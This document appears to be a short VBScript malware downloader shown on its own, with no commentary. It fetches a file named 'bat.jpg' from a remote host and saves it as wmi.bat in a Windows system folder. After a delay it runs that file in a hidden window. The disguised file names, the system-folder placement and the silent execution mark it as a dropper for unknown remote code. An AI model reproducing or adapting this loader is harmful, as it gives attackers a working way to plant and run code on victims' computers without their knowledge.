Set Post=CreateObject("Msxml2.XMLHTTP") 
Set Shell=CreateObject("Wscript.Shell") 
Post.Open "GET","http://zwz2007.199.hezu1.com/bat.jpg",0 
Post.Send() 
Set aGet=CreateObject("ADODB.Stream") 
aGet.Mode=3 
aGet.Type=1 
aGet.Open() 
aGet.Write(Post.responseBody) 
aGet.SaveToFile "C:\WINDOWS\addins\wmi.bat",2 
wscript.sleep 10000 
Shell.Run ("C:\WINDOWS\addins\wmi.bat setup"),vbhide 
